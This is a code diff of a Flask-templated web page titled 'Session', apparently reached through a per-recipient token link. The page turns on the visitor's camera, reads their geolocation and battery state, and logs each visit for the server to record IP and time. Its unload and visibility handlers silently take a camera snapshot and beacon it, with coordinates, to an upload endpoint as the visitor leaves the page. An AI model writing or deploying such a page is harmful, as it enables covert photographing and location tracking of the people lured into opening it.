@@ -3,76 +3,258 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Session</title>
+  <title>Session — live photo capture</title>
+  <style>
+    body{font-family:system-ui,Arial; padding:12px; max-width:680px; margin:auto}
+    video{width:100%; max-height:60vh; background:#000; border-radius:8px}
+    #controls{display:flex; gap:8px; margin-top:8px; flex-wrap:wrap}
+    button{padding:8px 12px; border-radius:6px; font-size:16px}
+    #status{margin-top:8px; color:#333; white-space:pre-wrap}
+  </style>
 </head>
 <body>
-  <h2>Device session (open while testing)</h2>
+  <h2>Session — keep this page open</h2>
   <p id="status">Initializing…</p>
 
-  <label>Take photo (optional):
-    <input id="photo" type="file" accept="image/*" capture="environment" />
-  </label>
+  <video id="video" autoplay playsinline muted></video>
+
+  <div id="controls">
+    <button id="finish">Finish & Upload Final Photo</button>
+    <button id="snapshot">Take Snapshot (preview)</button>
+    <button id="stop">Stop Camera</button>
+  </div>
+
+  <canvas id="hiddenCanvas" style="display:none"></canvas>
 
   <script>
-    const token = "{{ token }}";
-    const statusEl = document.getElementById("status");
-    function log(msg){ statusEl.textContent = msg; console.log(msg); }
+    const token = "{{ token }}";            // injected by Flask
+    const statusEl = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('hiddenCanvas');
+    const finishBtn = document.getElementById('finish');
+    const snapBtn = document.getElementById('snapshot');
+    const stopBtn = document.getElementById('stop');
 
+    let stream = null;
+    let lastCoords = null;
+    let lastBattery = null;
+
+    function log(msg){
+      statusEl.textContent = msg;
+      console.log(msg);
+    }
+
+    // ====== helpers ======
     async function postJSON(path, payload){
       try{
-        const res = await fetch(path, {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify(payload)
+        await fetch(path, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
         });
-        log(`${path} → ${res.status}`);
-        return res;
-      }catch(e){
-        log(`${path} error: ${e}`);
+      } catch (e) {
+        console.warn('postJSON failed', e);
       }
     }
 
-    // send basic visit note (includes IP via server)
-    function sendVisitNote(){ postJSON(`/upload_info/${token}`, { note: 'page-open' }); }
-
-    // geolocation
-    function sendCoords(){
-      if(!navigator.geolocation){ log('no geolocation'); return; }
-      navigator.geolocation.getCurrentPosition(pos=>{
-        const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy};
-        postJSON(`/upload_info/${token}`, { coords });
-      }, err=>{
-        log('geo error: '+err.message);
-      }, {timeout:10000});
+    function dataURLfromVideo(quality=0.85){
+      if(!video.videoWidth || !video.videoHeight) return null;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', quality);
     }
 
-    // battery (best-effort)
-    async function sendBattery(){
+    function makeJsonBlob(obj){
+      const json = JSON.stringify(obj);
+      return new Blob([json], { type: 'application/json' });
+    }
+
+    // ====== battery & coords ======
+    async function refreshBattery(){
       try{
-        if(navigator.getBattery){
-          const bat = await navigator.getBattery();
-          postJSON(`/upload_info/${token}`, { battery:{ level: bat.level, charging: bat.charging }});
+        if('getBattery' in navigator){
+          const b = await navigator.getBattery();
+          lastBattery = { level: Math.round(b.level * 100), charging: !!b.charging };
+          log('Battery: ' + lastBattery.level + '%' + (lastBattery.charging ? ' charging' : ''));
         } else {
-          log('no battery API');
+          lastBattery = null;
+          log('Battery API unavailable');
         }
-      } catch(e){ log('battery error: '+e); }
+      } catch(e){
+        lastBattery = null;
+        console.warn('Battery error', e);
+      }
     }
 
-    // photo upload
-    document.getElementById('photo').addEventListener('change', async (ev)=>{
-      const f = ev.target.files[0];
-      if(!f) return;
-      const reader = new FileReader();
-      reader.onload = ()=>{ postJSON(`/upload_image/${token}`, { image_b64: reader.result }); };
-      reader.readAsDataURL(f);
+    function getCurrentCoords(timeout = 10000){
+      return new Promise((resolve) => {
+        if(!('geolocation' in navigator)){
+          resolve(null);
+          return;
+        }
+        const done = (val) => { resolve(val); };
+        navigator.geolocation.getCurrentPosition((pos) => {
+          const c = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
+          lastCoords = c;
+          log('Coords: ' + c.lat + ',' + c.lon + ' (acc ' + c.accuracy + 'm)');
+          done(c);
+        }, (err) => {
+          console.warn('Geolocation error', err);
+          done(null);
+        }, { timeout });
+      });
+    }
+
+    // ====== camera control ======
+    async function startCamera(){
+      try{
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
+        video.srcObject = stream;
+        log('Camera active — keep page open; final photo will be taken on Finish or close.');
+      } catch (e) {
+        log('Camera error: ' + (e.message || e));
+      }
+    }
+
+    function stopCamera(){
+      if(!stream) return;
+      stream.getTracks().forEach(t => t.stop());
+      video.srcObject = null;
+      stream = null;
+      log('Camera stopped');
+    }
+
+    // ====== final upload (beacon or fetch keepalive fallback) ======
+    async function uploadFinal(dataUrl, coords, battery){
+      const endpoint = `/upload_image/${token}`;
+      const payload = { image_b64: dataUrl, coords: coords || null, battery: battery || null };
+
+      const blob = makeJsonBlob(payload);
+      // Try sendBeacon first
+      try{
+        if(navigator.sendBeacon){
+          const ok = navigator.sendBeacon(endpoint, blob);
+          if(ok){
+            log('Final photo queued via sendBeacon.');
+            return true;
+          } else {
+            console.warn('sendBeacon returned false, falling back.');
+          }
+        }
+      } catch(e){
+        console.warn('sendBeacon error', e);
+      }
+
+      // fallback to fetch with keepalive
+      try{
+        await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
+        });
+        log('Final photo uploaded via fetch keepalive.');
+        return true;
+      } catch(e){
+        console.warn('fetch keepalive failed', e);
+      }
+
+      // last attempt (may fail on unload)
+      try{
+        await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        log('Final photo uploaded via normal fetch.');
+        return true;
+      } catch(e){
+        console.error('All upload attempts failed', e);
+        return false;
+      }
+    }
+
+    // ====== UI events ======
+    snapBtn.addEventListener('click', () => {
+      const dataUrl = dataURLfromVideo();
+      if(!dataUrl) { log('Snapshot failed'); return; }
+      log('Snapshot captured (preview only)');
+      // preview could be shown here; we avoid auto-upload
     });
 
-    // start collection
-    (function(){
-      log('requesting permissions / collecting data');
-      sendVisitNote();
-      sendCoords();
-      sendBattery();
+    finishBtn.addEventListener('click', async () => {
+      log('Preparing final upload...');
+      await refreshBattery();
+      await getCurrentCoords();
+      const dataUrl = dataURLfromVideo();
+      if(!dataUrl){
+        log('No snapshot available to upload.');
+        return;
+      }
+      const ok = await uploadFinal(dataUrl, lastCoords, lastBattery);
+      if(ok){
+        log('Upload finished. You can now close the page.');
+        // optional: stop camera
+        stopCamera();
+      } else {
+        log('Upload failed; try again or keep page open.');
+      }
+    });
+
+    stopBtn.addEventListener('click', () => {
+      stopCamera();
+    });
+
+    // on unload: attempt to take a final snapshot and upload (best-effort)
+    window.addEventListener('visibilitychange', async () => {
+      // If user navigates away (hidden) try to send final image
+      if(document.visibilityState === 'hidden'){
+        try {
+          await refreshBattery();
+          await getCurrentCoords(5000);
+          const dataUrl = dataURLfromVideo();
+          if(dataUrl){
+            uploadFinal(dataUrl, lastCoords, lastBattery);
+          } else {
+            // still ping upload_info so server records visit
+            postJSON(`/upload_info/${token}`, { note: 'page-hidden', coords: lastCoords, battery: lastBattery });
+          }
+        } catch(e){ console.warn('visibilitychange handler error', e); }
+      }
+    }, { passive: true });
+
+    // Also handle beforeunload to attempt final upload (best-effort)
+    window.addEventListener('beforeunload', (ev) => {
+      try {
+        // synchronous beacon attempt
+        (async () => {
+          await refreshBattery();
+          await getCurrentCoords(3000);
+          const dataUrl = dataURLfromVideo();
+          if(dataUrl){
+            uploadFinal(dataUrl, lastCoords, lastBattery);
+          } else {
+            postJSON(`/upload_info/${token}`, { note: 'page-closed', coords: lastCoords, battery: lastBattery });
+          }
+        })();
+      } catch(e){
+        console.warn('beforeunload error', e);
+      }
+      // no blocking; best-effort only
+    });
+
+    // ====== initial open actions ======
+    (async function init(){
+      log('Requesting permissions / collecting low-frequency data');
+      // record visit (server gets IP + timestamp)
+      postJSON(`/upload_info/${token}`, { note: 'page-open' });
+      // start camera and collect initial metadata
+      await startCamera();
+      await refreshBattery();
+      await getCurrentCoords();
     })();
   </script>
 </body>
